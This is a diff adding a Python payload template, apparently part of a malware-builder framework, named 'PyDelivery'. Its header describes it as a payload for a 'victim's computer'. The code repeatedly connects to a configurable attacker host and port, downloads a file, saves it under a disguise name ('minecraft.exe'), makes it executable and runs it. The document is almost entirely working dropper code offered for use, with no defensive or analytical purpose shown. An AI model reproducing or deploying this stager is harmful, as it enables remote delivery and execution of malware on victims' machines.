@@ -1,0 +1,52 @@
+#!name##PyDelivery
+#!types##payload
+#!info##A script written in python. It connects to a server to download a pre-prepared file, once downloaded it runs it on the victim's computer. Perfect for working with a 'send' server.
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##PyD_port##Host port number##int
+#!setVar##PyD_port##4444##int
+#!reqVar##PyD_pause##The time interval between attempts to connect to the server.##int
+#!setVar##PyD_pause##5##int
+#!reqVar##PyD_fname##Name for the file stored on the victim's computer.##str
+#!setVar##PyD_fname##minecraft.exe##str
+#!render_FLAG##True
+#!import_FLAG##True
+
+import socket
+import os
+import multiprocessing
+from time import sleep
+
+
+def main():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try:
+            sock.connect(("{{IP_ADDR}}", {{PyD_port}}))
+            break
+        except:
+            pass
+        sleep({{PyD_pause}})
+    
+    data = b""
+    while True:
+        try:
+            recv = sock.recv(1024)
+        except TimeoutError:
+            continue
+        if recv:
+            data += recv
+        else:
+            break
+    fpath = os.path.join(os.getcwd(), "{{PyD_fname}}")
+    try:
+        with open(fpath, "wb") as f:
+            f.write(data)
+    except:
+        return
+    os.chmod(fpath, 0o777)
+    try:
+        os.system(fpath)
+    except:
+        pass
+
+main()
